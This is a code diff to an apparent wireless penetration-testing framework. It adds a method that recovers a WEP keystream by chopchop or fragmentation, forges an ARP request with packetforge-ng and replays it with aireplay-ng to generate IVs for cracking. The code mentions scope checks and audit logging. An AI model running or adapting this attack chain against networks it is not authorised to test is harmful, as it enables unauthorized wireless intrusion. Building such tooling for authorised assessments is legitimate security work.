@@ -33,6 +33,7 @@ from netreaper.orchestration.events import Events, event_bus
 from netreaper.safety.scope import Tier
 from netreaper.tools.aireplay import AireplayTool, AttackMode
 from netreaper.tools.airodump import AirodumpTool
+from netreaper.tools.packetforge import PacketforgeTool
 
 logger = get_logger(__name__)
 
@@ -86,6 +87,39 @@ INJECTION_MODES = frozenset(
 )
 
 
+# The strategies that recover a PRGA keystream rather than just replaying
+# traffic. Only these can feed packetforge-ng, because only these produce the
+# .xor file it reads. arpreplay replays a captured ARP and recovers nothing.
+KEYSTREAM_MODES = frozenset({"chopchop", "fragment", "caffe_latte", "cfrag"})
+
+
+def _as_data(result) -> dict:
+    """Normalise a tool return to its parsed-data dict.
+
+    The named aireplay helpers return ``result.data`` already, while the
+    lazily-dispatched strategies return the ``PluginResult`` itself, and a test
+    double that implements only the primitive it needs may return neither. The
+    return contract is deliberately not tightened in ``_injector``: doing that
+    is what the lazy-resolution note there exists to avoid. Normalise here, at
+    the one consumer that actually reads the result.
+    """
+    if result is None:
+        return {}
+    data = getattr(result, "data", result)
+    return data if isinstance(data, dict) else {}
+
+
+@dataclass
+class ForgeResult:
+    """Outcome of the keystream -> forge -> replay chain."""
+
+    strategy: str
+    keystream_file: str | None = None
+    packet_file: str | None = None
+    replayed: bool = False
+    reason: str | None = None
+
+
 @dataclass
 class WepResult:
     bssid: str
@@ -104,10 +138,12 @@ class WepAttack:
         airodump: AirodumpTool | None = None,
         aireplay: AireplayTool | None = None,
         cracker=crack_capture,
+        packetforge: PacketforgeTool | None = None,
     ) -> None:
         self._airodump = airodump or AirodumpTool()
         self._aireplay = aireplay or AireplayTool()
         self._cracker = cracker
+        self._packetforge = packetforge or PacketforgeTool()
 
     async def run(
         self,
@@ -260,10 +296,80 @@ class WepAttack:
         async def _run(iface: str, target_bssid: str, source: str):
             return await a.execute(
                 iface,
-                {"attack": mode, "bssid": target_bssid, "source_mac": source},
+                {"attack": mode, "bssid": target_bssid, "source": source},
             )
 
         return _run
+
+    async def forge_and_replay(
+        self,
+        interface: str,
+        bssid: str,
+        source_mac: str,
+        *,
+        strategy: str = "chopchop",
+        output: str | None = None,
+        **forge_options,
+    ) -> ForgeResult:
+        """Recover a keystream, forge an ARP request from it, and replay it.
+
+        This is the half of the chopchop and fragmentation attacks that was
+        missing. Those attacks exist to recover a PRGA keystream, and both wrote
+        one to a ``.xor`` file that nothing in this tree ever opened. Forging a
+        frame from it and putting that frame back on the air is the entire point
+        of recovering it: the AP rebroadcasts the forged ARP and every reply is
+        a fresh IV, which is what aircrack-ng needs.
+
+        Each of the three steps spawns through its own adapter, so each is
+        scope-gated and audited at the seam independently. The forge itself is
+        PASSIVE (a local file transform) while the replay is not, which is why
+        they are separate spawns rather than one.
+
+        Returns a ForgeResult describing how far the chain got. A keystream that
+        never appears is a normal outcome, not an error: chopchop against a
+        quiet AP simply does not recover one.
+        """
+        name = (strategy or "chopchop").strip().lower()
+        if name not in KEYSTREAM_MODES:
+            raise ConfigurationError(
+                f"{strategy!r} recovers no keystream; "
+                f"choose one of: {', '.join(sorted(KEYSTREAM_MODES))}"
+            )
+
+        result = ForgeResult(strategy=name)
+
+        data = _as_data(await self._injector(name)(interface, bssid, source_mac))
+        keystream = data.get("keystream_file")
+        if not keystream:
+            result.reason = "no keystream recovered"
+            logger.info("%s recovered no keystream against %s", name, bssid)
+            return result
+        result.keystream_file = keystream
+
+        packet = output or str(Path(keystream).with_suffix(".forged.cap"))
+        forged = await self._packetforge.forge_arp(
+            keystream, bssid, source_mac, packet, **forge_options
+        )
+        if not forged.get("success"):
+            result.reason = "packetforge-ng did not write a packet"
+            return result
+        result.packet_file = forged.get("packet_file") or packet
+
+        # Replay the forged frame. "read_file" is the option _common_args maps
+        # to -r; interactive replay without it can only resend what it sniffs.
+        replay = _as_data(
+            await self._aireplay.execute(
+                interface,
+                {
+                    "attack": AttackMode.INTERACTIVE,
+                    "bssid": bssid,
+                    "source": source_mac,
+                    "read_file": result.packet_file,
+                },
+            )
+        )
+        result.replayed = bool(replay.get("success", True))
+        return result
 
     @staticmethod
     def _resolve_prefix(output: str | None):
